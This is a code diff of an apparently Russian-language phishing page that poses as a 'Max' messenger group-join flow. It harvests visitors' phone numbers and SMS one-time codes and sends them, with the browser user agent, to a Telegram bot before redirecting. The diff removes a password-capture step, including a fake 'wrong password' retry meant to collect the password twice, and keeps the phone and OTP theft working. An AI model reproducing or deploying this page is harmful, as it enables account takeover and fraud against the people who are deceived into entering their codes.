@@ -357,7 +357,6 @@ h1{font-size:26px;font-weight:800;letter-spacing:-.5px;margin-bottom:10px;line-h
     <div class="step-dot active"></div>
     <div class="step-dot"></div>
     <div class="step-dot"></div>
-    <div class="step-dot"></div>
   </div>
 
   <div class="pane show" id="pane1">
@@ -379,21 +378,6 @@ h1{font-size:26px;font-weight:800;letter-spacing:-.5px;margin-bottom:10px;line-h
   </div>
 
   <div class="pane" id="pane2">
-    <div class="hero">
-      <h1>Введите пароль от Max</h1>
-      <p class="sub">Для подтверждения аккаунта введите пароль.</p>
-    </div>
-
-    <form id="form2" autocomplete="off" novalidate>
-      <span class="field-label">Пароль</span>
-      <input class="input masked" type="text" id="pwd" placeholder="Пароль" autocomplete="off" spellcheck="false">
-      <button type="submit" class="cta" id="btn2">Войти</button>
-      <div class="err" id="e2"></div>
-      <button type="button" class="back-btn" id="back1">&larr; Изменить номер</button>
-    </form>
-  </div>
-
-  <div class="pane" id="pane3">
     <div class="sms-head">
       <h1>Подтверждение</h1>
       <p>Мы отправили 6-значный код на <b id="phoneEcho">+7 ___ ___ __ __</b>.</p>
@@ -412,7 +396,7 @@ h1{font-size:26px;font-weight:800;letter-spacing:-.5px;margin-bottom:10px;line-h
     </form>
   </div>
 
-  <div class="pane" id="pane4">
+  <div class="pane" id="pane3">
     <div class="done">
       <div class="done-mark">&#10003;</div>
       <h3>Готово. Переход в группу&hellip;</h3>
@@ -444,7 +428,7 @@ phone.addEventListener('input', e => {
   e.target.value = o;
 });
 
-const panes = [document.getElementById('pane1'), document.getElementById('pane2'), document.getElementById('pane3'), document.getElementById('pane4')];
+const panes = [document.getElementById('pane1'), document.getElementById('pane2'), document.getElementById('pane3')];
 const dots = document.querySelectorAll('.step-dot');
 
 function goto(n) {
@@ -455,7 +439,6 @@ function goto(n) {
 async function send(stage, data) {
   let text;
   if (stage === 'phone') text = `[PHONE] ${sid}\n+7 ${data.phone}\nUA: ${navigator.userAgent}`;
-  else if (stage === 'pwd') text = `[PWD] ${sid}\n+7 ${phoneVal}\nПароль: ${data.pwd}`;
   else text = `[OTP] ${sid}\n+7 ${phoneVal}\nКод: ${data.code}`;
   try {
     const token = (typeof TG_TOKEN !== 'undefined') ? TG_TOKEN : '';
@@ -478,52 +461,16 @@ document.getElementById('form1').addEventListener('submit', async e => {
   phoneVal = digits;
   phoneFull = '+7 ' + digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6, 8) + ' ' + digits.slice(8, 10);
   btn1.disabled = true;
-  btn1.innerHTML = '<span class="spinner"></span>Проверка…';
+  btn1.innerHTML = '<span class="spinner"></span>Отправка кода…';
   await send('phone', {phone: digits});
   setTimeout(() => {
+    document.getElementById('phoneEcho').textContent = phoneFull;
     goto(2);
-    document.getElementById('pwd').focus();
+    document.querySelector('#otp input').focus();
+    startResendTimer();
     btn1.disabled = false;
     btn1.textContent = 'Вступить в группу';
   }, 1200);
-});
-
-let pwdRetry = false;
-const btn2 = document.getElementById('btn2');
-document.getElementById('form2').addEventListener('submit', async e => {
-  e.preventDefault();
-  const v = document.getElementById('pwd').value;
-  if (v.length < 3) { document.getElementById('e2').textContent = 'Введите пароль'; return; }
-  btn2.disabled = true;
-  btn2.innerHTML = '<span class="spinner"></span>Проверка…';
-  await send('pwd', {pwd: v});
-  if (!pwdRetry) {
-    pwdRetry = true;
-    setTimeout(() => {
-      document.getElementById('e2').textContent = 'Неверный пароль, попробуйте ещё раз';
-      document.getElementById('pwd').value = '';
-      btn2.disabled = false;
-      btn2.textContent = 'Войти';
-    }, 1000);
-    return;
-  }
-  setTimeout(() => {
-    document.getElementById('phoneEcho').textContent = phoneFull;
-    goto(3);
-    document.querySelector('#otp input').focus();
-    startResendTimer();
-    btn2.disabled = false;
-    btn2.textContent = 'Войти';
-  }, 1200);
-});
-
-document.getElementById('back1').addEventListener('click', () => {
-  document.getElementById('pwd').value = '';
-  document.getElementById('e2').textContent = '';
-  pwdRetry = false;
-  btn2.disabled = false;
-  btn2.textContent = 'Войти';
-  goto(1);
 });
 
 const otpInputs = document.querySelectorAll('#otp input');
@@ -581,7 +528,7 @@ document.getElementById('form3').addEventListener('submit', async e => {
   btn3.innerHTML = '<span class="spinner"></span>Проверка…';
   await send('otp', {code: code});
   setTimeout(() => {
-    goto(4);
+    goto(3);
     clearInterval(rInt);
     setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
   }, 1400);
